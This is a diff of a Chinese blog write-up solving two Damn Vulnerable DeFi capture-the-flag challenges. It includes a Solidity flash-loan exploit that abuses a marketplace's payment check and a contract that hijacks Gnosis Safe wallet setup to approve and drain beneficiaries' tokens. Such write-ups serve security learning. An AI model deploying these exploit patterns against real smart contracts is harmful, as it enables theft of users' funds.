 import &quot;./FreeRiderBuyer.sol&quot;;
 import &quot;./FreeRiderNFTMarketplace.sol&quot;;
@@ -454,41 +353,41 @@ IERC721 immutable nft;
 
     function attack() public {
         uniswapPair.swap(
-            120 ether,         //根据分析，我们一共需要从闪电贷借120ETH
-            0 ,                //我们不关心这个参数，因为我们只用借ETH
-            address(this),     //借款发送到此合约
-            hex&quot;00&quot;            //为了使data不为空（我们不关心此参数）
+            120 ether,         //&#x6839;&#x636E;&#x5206;&#x6790;&#xFF0C;&#x6211;&#x4EEC;&#x4E00;&#x5171;&#x9700;&#x8981;&#x4ECE;&#x95EA;&#x7535;&#x8D37;&#x501F;120ETH
+            0 ,                //&#x6211;&#x4EEC;&#x4E0D;&#x5173;&#x5FC3;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x53EA;&#x7528;&#x501F;ETH
+            address(this),     //&#x501F;&#x6B3E;&#x53D1;&#x9001;&#x5230;&#x6B64;&#x5408;&#x7EA6;
+            hex&quot;00&quot;            //&#x4E3A;&#x4E86;&#x4F7F;data&#x4E0D;&#x4E3A;&#x7A7A;&#xFF08;&#x6211;&#x4EEC;&#x4E0D;&#x5173;&#x5FC3;&#x6B64;&#x53C2;&#x6570;&#xFF09;
         );           
     }
     
-    //闪电贷回调函数
+    //&#x95EA;&#x7535;&#x8D37;&#x56DE;&#x8C03;&#x51FD;&#x6570;
     function uniswapV2Call(address, uint, uint, bytes calldata) external override {
         console.log(&quot;success in line&quot;, 62);
-        //通过闪电借的120 ether先提款到此合约
+        //&#x901A;&#x8FC7;&#x95EA;&#x7535;&#x501F;&#x7684;120 ether&#x5148;&#x63D0;&#x6B3E;&#x5230;&#x6B64;&#x5408;&#x7EA6;
         weth.withdraw(120 ether);
         console.log(&quot;success in line&quot;, 65);
-        //先买两个NFT
+        //&#x5148;&#x4E70;&#x4E24;&#x4E2A;NFT
         uint256[] memory tokenids1 = new uint256[](2);
         tokenids1[0] = 0;
         tokenids1[1] = 1;
         market.buyMany{value: 30 ether}(tokenids1);
 
-        //以90的价格放入市场
+        //&#x4EE5;90&#x7684;&#x4EF7;&#x683C;&#x653E;&#x5165;&#x5E02;&#x573A;
         nft.setApprovalForAll(address(market), true);
         uint256[] memory price1 = new uint256[](2);
         price1[0] = 90 ether;
         price1[1] = 90 ether;
         market.offerMany(tokenids1, price1);
 
-        //利用重入漏洞以90ether的价格买下这两个NFT
+        //&#x5229;&#x7528;&#x91CD;&#x5165;&#x6F0F;&#x6D1E;&#x4EE5;90ether&#x7684;&#x4EF7;&#x683C;&#x4E70;&#x4E0B;&#x8FD9;&#x4E24;&#x4E2A;NFT
         market.buyMany{value:90 ether}(tokenids1);
 
-        //还款
+        //&#x8FD8;&#x6B3E;
         uint256 fee = ((120 ether * 3) / uint256(997)) + 1;
         weth.deposit{value: 120 ether + fee}();
         weth.transfer(address(uniswapPair), 120 ether + fee);
 
-        //用60ETH买4个NFT
+        //&#x7528;60ETH&#x4E70;4&#x4E2A;NFT
         tokenids1 = new uint256[](4);
         tokenids1[0] = 2;
         tokenids1[1] = 3;
@@ -496,7 +395,7 @@ IERC721 immutable nft;
         tokenids1[3] = 5;
         market.buyMany{value:60 ether}(tokenids1);
 
-        //把六个nft都给buyer
+        //&#x628A;&#x516D;&#x4E2A;nft&#x90FD;&#x7ED9;buyer
         for(uint8 tokenId = 0; tokenId &lt; 6; tokenId++){
             nft.safeTransferFrom(address(this), buyer, tokenId);
         }
@@ -512,68 +411,69 @@ IERC721 immutable nft;
     }
 
 }
-</div></code></pre>
-<ul>
-<li>总结：在合约中重用相同的内容（通常通过循环或某种批处理/多调用函数）是一个非常重要的漏洞。</li>
+</code></pre><ul>
+<li>&#x603B;&#x7ED3;&#xFF1A;&#x5728;&#x5408;&#x7EA6;&#x4E2D;&#x91CD;&#x7528;&#x76F8;&#x540C;&#x7684;&#x5185;&#x5BB9;&#xFF08;&#x901A;&#x5E38;&#x901A;&#x8FC7;&#x5FAA;&#x73AF;&#x6216;&#x67D0;&#x79CD;&#x6279;&#x5904;&#x7406;/&#x591A;&#x8C03;&#x7528;&#x51FD;&#x6570;&#xFF09;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#x6F0F;&#x6D1E;&#x3002;</li>
 </ul>
-<h2 id="11-backdoor">11 Backdoor</h2>
-<p>这个题我花费了大量的时间！因为需要对<code>GnosisSafe</code>Wallet的源码足够了解。在做这个挑战的时候又不停的在学习有关操作码的东西，这很麻烦。我必须说这个题是我目前做到的挑战里面比较折磨我的。
-这个挑战的背景是<a href="https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol">Gnosis安全钱包</a>,有人部署了钱包的注册表，当此团队中的人部署钱包时，他们将获得10个token，我们要做的就是拿到着40个token</p>
-<h3 id="code-review"><strong>Code Review</strong></h3>
-<p>这个挑战只有一个注册表合约，但往往看似简单的东西都挺难的。</p>
+<h2 class="mume-header" id="11-backdoor">11 Backdoor</h2>
+
+<p>&#x8FD9;&#x4E2A;&#x9898;&#x6211;&#x82B1;&#x8D39;&#x4E86;&#x5927;&#x91CF;&#x7684;&#x65F6;&#x95F4;&#xFF01;&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x5BF9;<code>GnosisSafe</code>Wallet&#x7684;&#x6E90;&#x7801;&#x8DB3;&#x591F;&#x4E86;&#x89E3;&#x3002;&#x5728;&#x505A;&#x8FD9;&#x4E2A;&#x6311;&#x6218;&#x7684;&#x65F6;&#x5019;&#x53C8;&#x4E0D;&#x505C;&#x7684;&#x5728;&#x5B66;&#x4E60;&#x6709;&#x5173;&#x64CD;&#x4F5C;&#x7801;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x8FD9;&#x5F88;&#x9EBB;&#x70E6;&#x3002;&#x6211;&#x5FC5;&#x987B;&#x8BF4;&#x8FD9;&#x4E2A;&#x9898;&#x662F;&#x6211;&#x76EE;&#x524D;&#x505A;&#x5230;&#x7684;&#x6311;&#x6218;&#x91CC;&#x9762;&#x6BD4;&#x8F83;&#x6298;&#x78E8;&#x6211;&#x7684;&#x3002;<br>
+&#x8FD9;&#x4E2A;&#x6311;&#x6218;&#x7684;&#x80CC;&#x666F;&#x662F;<a href="https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol">Gnosis&#x5B89;&#x5168;&#x94B1;&#x5305;</a>,&#x6709;&#x4EBA;&#x90E8;&#x7F72;&#x4E86;&#x94B1;&#x5305;&#x7684;&#x6CE8;&#x518C;&#x8868;&#xFF0C;&#x5F53;&#x6B64;&#x56E2;&#x961F;&#x4E2D;&#x7684;&#x4EBA;&#x90E8;&#x7F72;&#x94B1;&#x5305;&#x65F6;&#xFF0C;&#x4ED6;&#x4EEC;&#x5C06;&#x83B7;&#x5F97;10&#x4E2A;token&#xFF0C;&#x6211;&#x4EEC;&#x8981;&#x505A;&#x7684;&#x5C31;&#x662F;&#x62FF;&#x5230;&#x7740;40&#x4E2A;token</p>
+<h3 class="mume-header" id="code-review-1"><strong>Code Review</strong></h3>
+
+<p>&#x8FD9;&#x4E2A;&#x6311;&#x6218;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x6CE8;&#x518C;&#x8868;&#x5408;&#x7EA6;&#xFF0C;&#x4F46;&#x5F80;&#x5F80;&#x770B;&#x4F3C;&#x7B80;&#x5355;&#x7684;&#x4E1C;&#x897F;&#x90FD;&#x633A;&#x96BE;&#x7684;&#x3002;</p>
 <ul>
-<li><strong>WalletRegistry</strong>
-注册表合约
+<li><strong>WalletRegistry</strong><br>
+&#x6CE8;&#x518C;&#x8868;&#x5408;&#x7EA6;
 <ul>
-<li>addBeneficiary()
-添加受益人到注册表的函数,beneficiaries[]就是检测是否为注册表里有的地址</li>
-<li>_removeBeneficiary()
-在受益人收益后从注册表删除此受益人</li>
-<li><strong>proxyCreated</strong>
-通过注释我们可以知道这是创建钱包时会调用的一个回调函数，而这个函数的作用就是给注册表中的受益人那10个token。</li>
+<li>addBeneficiary()<br>
+&#x6DFB;&#x52A0;&#x53D7;&#x76CA;&#x4EBA;&#x5230;&#x6CE8;&#x518C;&#x8868;&#x7684;&#x51FD;&#x6570;,beneficiaries[]&#x5C31;&#x662F;&#x68C0;&#x6D4B;&#x662F;&#x5426;&#x4E3A;&#x6CE8;&#x518C;&#x8868;&#x91CC;&#x6709;&#x7684;&#x5730;&#x5740;</li>
+<li>_removeBeneficiary()<br>
+&#x5728;&#x53D7;&#x76CA;&#x4EBA;&#x6536;&#x76CA;&#x540E;&#x4ECE;&#x6CE8;&#x518C;&#x8868;&#x5220;&#x9664;&#x6B64;&#x53D7;&#x76CA;&#x4EBA;</li>
+<li><strong>proxyCreated</strong><br>
+&#x901A;&#x8FC7;&#x6CE8;&#x91CA;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x8FD9;&#x662F;&#x521B;&#x5EFA;&#x94B1;&#x5305;&#x65F6;&#x4F1A;&#x8C03;&#x7528;&#x7684;&#x4E00;&#x4E2A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#x7ED9;&#x6CE8;&#x518C;&#x8868;&#x4E2D;&#x7684;&#x53D7;&#x76CA;&#x4EBA;&#x90A3;10&#x4E2A;token&#x3002;</li>
 </ul>
 </li>
 </ul>
-<p>看起来，重头戏并不在这里，于是我把目光投向了<code>GnosisSafe</code>钱包的源码</p>
+<p>&#x770B;&#x8D77;&#x6765;&#xFF0C;&#x91CD;&#x5934;&#x620F;&#x5E76;&#x4E0D;&#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x628A;&#x76EE;&#x5149;&#x6295;&#x5411;&#x4E86;<code>GnosisSafe</code>&#x94B1;&#x5305;&#x7684;&#x6E90;&#x7801;</p>
 <ul>
 <li>
-<p><strong>GnosisSafe源码</strong>
-首先我们全局搜索回调<code>proxyCreated</code>的的地方，只有一个<code>createProxyWithCallback()</code>函数</p>
+<p><strong>GnosisSafe&#x6E90;&#x7801;</strong><br>
+&#x9996;&#x5148;&#x6211;&#x4EEC;&#x5168;&#x5C40;&#x641C;&#x7D22;&#x56DE;&#x8C03;<code>proxyCreated</code>&#x7684;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;<code>createProxyWithCallback()</code>&#x51FD;&#x6570;</p>
 <ul>
 <li>
-<p><strong>GnosisSafeProxyFactory</strong> -createProxyWithCallback
-<img src="../images/Damn/Damn10_CallBack.png" alt="">
-入参有四个：</p>
+<p><strong>GnosisSafeProxyFactory</strong> -createProxyWithCallback<br>
+<img src="../images/Damn/Damn10_CallBack.png" alt><br>
+&#x5165;&#x53C2;&#x6709;&#x56DB;&#x4E2A;&#xFF1A;</p>
 <ol>
-<li>address _singleton
-这是一个单例地址</li>
-<li>bytes memory initializer
-这是初始化器的字节码，初始化函数其实就是<code>GnosisSafe</code>里的<code>setup()</code>函数</li>
-<li>uint256 saltNonce
-这是Create2里的随机数，我们不用关心</li>
-<li>IProxyCreationCallback callback
-这是回调合约的地址
-我们直接关注回调的地方，<code>callback.proxyCreated(proxy, _singleton, initializer, saltNonce);</code>这里只是简单的一个回调，参数看上去也没有什么漏洞。
-然后就是在上一行调用了<code>createProxyWithNonce</code>函数</li>
+<li>address _singleton<br>
+&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x5355;&#x4F8B;&#x5730;&#x5740;</li>
+<li>bytes memory initializer<br>
+&#x8FD9;&#x662F;&#x521D;&#x59CB;&#x5316;&#x5668;&#x7684;&#x5B57;&#x8282;&#x7801;&#xFF0C;&#x521D;&#x59CB;&#x5316;&#x51FD;&#x6570;&#x5176;&#x5B9E;&#x5C31;&#x662F;<code>GnosisSafe</code>&#x91CC;&#x7684;<code>setup()</code>&#x51FD;&#x6570;</li>
+<li>uint256 saltNonce<br>
+&#x8FD9;&#x662F;Create2&#x91CC;&#x7684;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x4E0D;&#x7528;&#x5173;&#x5FC3;</li>
+<li>IProxyCreationCallback callback<br>
+&#x8FD9;&#x662F;&#x56DE;&#x8C03;&#x5408;&#x7EA6;&#x7684;&#x5730;&#x5740;<br>
+&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x5173;&#x6CE8;&#x56DE;&#x8C03;&#x7684;&#x5730;&#x65B9;&#xFF0C;<code>callback.proxyCreated(proxy, _singleton, initializer, saltNonce);</code>&#x8FD9;&#x91CC;&#x53EA;&#x662F;&#x7B80;&#x5355;&#x7684;&#x4E00;&#x4E2A;&#x56DE;&#x8C03;&#xFF0C;&#x53C2;&#x6570;&#x770B;&#x4E0A;&#x53BB;&#x4E5F;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x6F0F;&#x6D1E;&#x3002;<br>
+&#x7136;&#x540E;&#x5C31;&#x662F;&#x5728;&#x4E0A;&#x4E00;&#x884C;&#x8C03;&#x7528;&#x4E86;<code>createProxyWithNonce</code>&#x51FD;&#x6570;</li>
 </ol>
 </li>
 <li>
-<p><strong>GnosisSafeProxyFactory</strong> -createProxyWithNonce
-这个函数内主要其实就是对initializer初始化函数的调用，只不过是用汇编实现的。
-看起来关键可能在于<code>setup</code>函数</p>
+<p><strong>GnosisSafeProxyFactory</strong> -createProxyWithNonce<br>
+&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5185;&#x4E3B;&#x8981;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x5BF9;initializer&#x521D;&#x59CB;&#x5316;&#x51FD;&#x6570;&#x7684;&#x8C03;&#x7528;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x662F;&#x7528;&#x6C47;&#x7F16;&#x5B9E;&#x73B0;&#x7684;&#x3002;<br>
+&#x770B;&#x8D77;&#x6765;&#x5173;&#x952E;&#x53EF;&#x80FD;&#x5728;&#x4E8E;<code>setup</code>&#x51FD;&#x6570;</p>
 </li>
 <li>
-<p><strong>GnosisSafe</strong> -setup
-这是Gnosis钱包的一个初始化函数，我一眼就看到了<code>setupModules(to, data);</code>这明显是一个外部调用，这给我了一点希望。再仔细一看这里的参数确实是可以导致借入的。我们可以借此让钱包approve给我们所有的token，我们只需要把这个token转出来即可。</p>
+<p><strong>GnosisSafe</strong> -setup<br>
+&#x8FD9;&#x662F;Gnosis&#x94B1;&#x5305;&#x7684;&#x4E00;&#x4E2A;&#x521D;&#x59CB;&#x5316;&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4E00;&#x773C;&#x5C31;&#x770B;&#x5230;&#x4E86;<code>setupModules(to, data);</code>&#x8FD9;&#x660E;&#x663E;&#x662F;&#x4E00;&#x4E2A;&#x5916;&#x90E8;&#x8C03;&#x7528;&#xFF0C;&#x8FD9;&#x7ED9;&#x6211;&#x4E86;&#x4E00;&#x70B9;&#x5E0C;&#x671B;&#x3002;&#x518D;&#x4ED4;&#x7EC6;&#x4E00;&#x770B;&#x8FD9;&#x91CC;&#x7684;&#x53C2;&#x6570;&#x786E;&#x5B9E;&#x662F;&#x53EF;&#x4EE5;&#x5BFC;&#x81F4;&#x501F;&#x5165;&#x7684;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x501F;&#x6B64;&#x8BA9;&#x94B1;&#x5305;approve&#x7ED9;&#x6211;&#x4EEC;&#x6240;&#x6709;&#x7684;token&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x628A;&#x8FD9;&#x4E2A;token&#x8F6C;&#x51FA;&#x6765;&#x5373;&#x53EF;&#x3002;</p>
 </li>
 </ul>
 </li>
 <li>
-<p><strong>Exploit</strong>
-总结一下以上的分析，其实这个题就是利用了一个gnosis钱包的一个外部调用，再钱包的上下文中执行<code>approve</code></p>
+<p><strong>Exploit</strong><br>
+&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#x4EE5;&#x4E0A;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x5176;&#x5B9E;&#x8FD9;&#x4E2A;&#x9898;&#x5C31;&#x662F;&#x5229;&#x7528;&#x4E86;&#x4E00;&#x4E2A;gnosis&#x94B1;&#x5305;&#x7684;&#x4E00;&#x4E2A;&#x5916;&#x90E8;&#x8C03;&#x7528;&#xFF0C;&#x518D;&#x94B1;&#x5305;&#x7684;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x6267;&#x884C;<code>approve</code></p>
 </li>
 </ul>
-<pre class="hljs"><code><div>// SPDX-License-Identifier: MIT
+<pre data-role="codeBlock" data-info class="language-"><code>// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 import &quot;@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol&quot;;
@@ -617,8 +517,8 @@ contract BackdoorExploit {
 
     function GiveApprove(address _token, address _spender) external {
         DamnValuableToken(_token).approve(_spender, 10 * 10**18);
-        // console.log(&quot;The spender's address :&quot;, _spender);
-        console.log(&quot;The Giver's address:&quot;, msg.sender);
+        // console.log(&quot;The spender&apos;s address :&quot;, _spender);
+        console.log(&quot;The Giver&apos;s address:&quot;, msg.sender);
     }
 
     function creatWallet(address[] memory victims)external returns (address newproxy){
@@ -627,10 +527,10 @@ contract BackdoorExploit {
             owner[0] = victims[i];
             bytes memory init = abi.encodeWithSelector(
                 GnosisSafe.setup.selector, 
-                owner,                                      //新建钱包的owner
-                1,                                          //threshold 只能为1
-                address(this),                              //漏洞出现点
-                abi.encodeWithSelector(                     //借入
+                owner,                                      //&#x65B0;&#x5EFA;&#x94B1;&#x5305;&#x7684;owner
+                1,                                          //threshold &#x53EA;&#x80FD;&#x4E3A;1
+                address(this),                              //&#x6F0F;&#x6D1E;&#x51FA;&#x73B0;&#x70B9;
+                abi.encodeWithSelector(                     //&#x501F;&#x5165;
                     BackdoorExploit.GiveApprove.selector, 
                     address(token),
                     address(this)
@@ -647,8 +547,8 @@ contract BackdoorExploit {
             i,
             IProxyCreationCallback(registryAddress)
         );
-        // console.log(&quot;The msg.sender's address:&quot;, msg.sender);
-        console.log(&quot;The proxy's address:&quot;, address(proxy));
+        // console.log(&quot;The msg.sender&apos;s address:&quot;, msg.sender);
+        console.log(&quot;The proxy&apos;s address:&quot;, address(proxy));
         // console.log(&quot;The this address:&quot;, address(this));
         DamnValuableToken(token).transferFrom(address(proxy), msg.sender, 10 *10**18);
         }
@@ -656,7 +556,17 @@ contract BackdoorExploit {
     }
 
 }
-</div></code></pre>
-
-</body>
-</html>
+</code></pre>
+      </div>
+      
+      
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    </body></html>
